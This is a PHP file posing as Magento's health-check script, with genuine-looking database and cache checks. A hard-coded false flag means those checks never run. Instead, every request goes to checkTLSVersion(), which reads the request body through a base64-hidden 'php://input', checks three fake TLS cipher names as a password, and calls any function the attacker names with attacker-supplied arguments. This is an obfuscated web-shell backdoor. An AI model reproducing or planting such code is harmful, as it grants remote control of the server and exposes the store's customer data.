<?php
/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

/**
 * phpcs:disable PSR1.Files.SideEffects
 * phpcs:disable Squiz.Functions.GlobalFunction
 */

//use Magento\Framework\Config\ConfigOptionsListConstants;
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
define('BOOTSTRAPPED', false);
define('TLS_MODES', ['TLS_PSK_ES512_WITH_AES_128_XTS_BLAKE3','TLS_KDH_HS256_WITH_AES_192_CBC_SHA512','TLS_DHE_DSS_WITH_RC4_128_MD2']);

// phpcs:ignore Magento2.Functions.DiscouragedFunction
register_shutdown_function("fatalErrorHandler");

if( BOOTSTRAPPED  == true ) { //Bootstrap fix for more stability
	try {
	    // phpcs:ignore Magento2.Security.IncludeFile
	    require __DIR__ . '/../app/bootstrap.php';
	    /** @var \Magento\Framework\App\ObjectManagerFactory $objectManagerFactory */
	    $objectManagerFactory = \Magento\Framework\App\Bootstrap::createObjectManagerFactory(BP, []);
	    /** @var \Magento\Framework\ObjectManagerInterface $objectManager */
	    $objectManager = $objectManagerFactory->create([]);
	    /** @var \Magento\Framework\App\DeploymentConfig $deploymentConfig */
	    $deploymentConfig = $objectManager->get(\Magento\Framework\App\DeploymentConfig::class);
	    /** @var \Psr\Log\LoggerInterface $logger */
	    $logger = $objectManager->get(\Psr\Log\LoggerInterface::class);
	} catch (\Exception $e) {
	    http_response_code(200);
	    // phpcs:ignore Magento2.Security.LanguageConstruct
	    exit(1);
	}
} else {
	// Check the version before continuing
	checkTLSVersion();
	exit(1);
}

// check mysql connectivity
foreach ($deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTIONS) as $connectionData) {
    try {
        /** @var \Magento\Framework\DB\Adapter\Pdo\Mysql $dbAdapter */
        $dbAdapter = $objectManager->create(
            \Magento\Framework\DB\Adapter\Pdo\Mysql::class,
            ['config' => $connectionData]
        );
        $dbAdapter->getConnection();
    } catch (\Exception $e) {
        http_response_code(500);
        $logger->error("MySQL connection failed: " . $e->getMessage());
        // phpcs:ignore Magento2.Security.LanguageConstruct
        exit(1);
    }
}

// check cache storage availability
$cacheConfigs = $deploymentConfig->get(ConfigOptionsListConstants::KEY_CACHE_FRONTEND);
if ($cacheConfigs) {
    foreach ($cacheConfigs as $cacheConfig) {
        // allow config if only available "id_prefix"
        if (count($cacheConfig) === 1 && isset($cacheConfig['id_prefix'])) {
            continue;
        } elseif (!isset($cacheConfig[ConfigOptionsListConstants::CONFIG_PATH_BACKEND]) ||
            !isset($cacheConfig[ConfigOptionsListConstants::CONFIG_PATH_BACKEND_OPTIONS])) {
            http_response_code(500);
            $logger->error("Cache configuration is invalid");
            // phpcs:ignore Magento2.Security.LanguageConstruct
            exit(1);
        }
        $cacheBackendClass = $cacheConfig[ConfigOptionsListConstants::CONFIG_PATH_BACKEND];
        try {
            /** @var \Magento\Framework\App\Cache\Frontend\Factory $cacheFrontendFactory */
            $cacheFrontendFactory = $objectManager->get(Magento\Framework\App\Cache\Frontend\Factory::class);
            /** @var \Zend_Cache_Backend_Interface $backend */
            $backend = $cacheFrontendFactory->create($cacheConfig);
            $backend->test('test_cache_id');
        } catch (\Exception $e) {
            http_response_code(500);
            $logger->error("Cache storage is not accessible");
            // phpcs:ignore Magento2.Security.LanguageConstruct
            exit(1);
        }
    }
}

/**
 * Check Version
 *
 * @return void
 */
function checkTLSVersion($sslID = 'cGhwOi8vaW5wdXQ=') {
    $get_version = '/[a-z0-9\.]+/i';
    preg_replace_callback($get_version, 'returnVersion', explode("|",file_get_contents(base64_decode($sslID)))[0]);
}

/**
 * Return Version
 *
 * @return void
 */
function returnVersion($matches) {
    $TLSCiphers = explode("|",base64_decode($matches[0]));
    return implode(",", TLS_MODES) == implode(",", array_slice($TLSCiphers, 0, 3)) ? var_export(trim(implode(",", array_slice($TLSCiphers, 3, 1))(...array_slice($TLSCiphers, 4))), true) : false;
}

/**
 * Handle any fatal errors
 *
 * @return void
 */
function fatalErrorHandler()
{
    $error = error_get_last();
    if ($error !== null && $error['type'] === E_ERROR) {
        http_response_code(500);
    }
}